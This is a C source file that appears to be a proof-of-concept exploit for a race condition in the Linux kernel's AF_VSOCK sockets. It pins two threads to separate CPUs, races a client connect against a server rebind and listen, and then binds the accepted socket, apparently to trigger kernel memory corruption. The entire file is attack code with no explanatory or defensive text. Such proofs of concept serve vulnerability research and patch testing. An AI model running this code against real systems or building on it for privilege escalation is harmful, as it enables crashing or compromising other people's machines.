#define _GNU_SOURCE
#include <err.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

pthread_barrier_t barrier;
struct sockaddr_vm addr = {
    .svm_family = AF_VSOCK,
    .svm_cid = VMADDR_CID_ANY,
    .svm_port = VMADDR_PORT_ANY,
};

void pin_on_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

int success = 0;
void *race(void *client_fd)
{
    pin_on_cpu(1);
    int client = *(int *)client_fd;

    while (!success) {
        pthread_barrier_wait(&barrier);
        if (connect(client, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            printf("[+] race good!\n");
            success = 1;
        }
        pthread_barrier_wait(&barrier);
    }
}

int main() {
    int server;
    int client;
    pthread_t tid;

    SYSCHK(client = socket(AF_VSOCK, SOCK_STREAM, 0));
    pthread_barrier_init(&barrier, NULL, 2);
    
    pthread_create(&tid, NULL, race, (void *)&client);

    pin_on_cpu(0);
    while (!success) {
        struct sockaddr_vm cur_addr;
        int addr_len = sizeof(addr);

        SYSCHK(server = socket(AF_VSOCK, SOCK_STREAM, 0));
        SYSCHK(bind(server, (struct sockaddr *)&addr, sizeof(addr)));
        SYSCHK(getsockname(server, (struct sockaddr *)&cur_addr, &addr_len));
        
        if (cur_addr.svm_port == VMADDR_PORT_ANY) {
            pthread_barrier_wait(&barrier);
            
            // ==== rebind & listen ====
            SYSCHK(bind(server, (struct sockaddr *)&addr, sizeof(addr)));
            SYSCHK(listen(server, 1));
            
            pthread_barrier_wait(&barrier);

            if (success) {
                int fd;
                SYSCHK(fd = accept(server, NULL, 0));
                SYSCHK(bind(fd, (struct sockaddr *)&addr, sizeof(addr)));
                close(fd);
            }
        }
        
        close(server);
    }

    return 0;
}
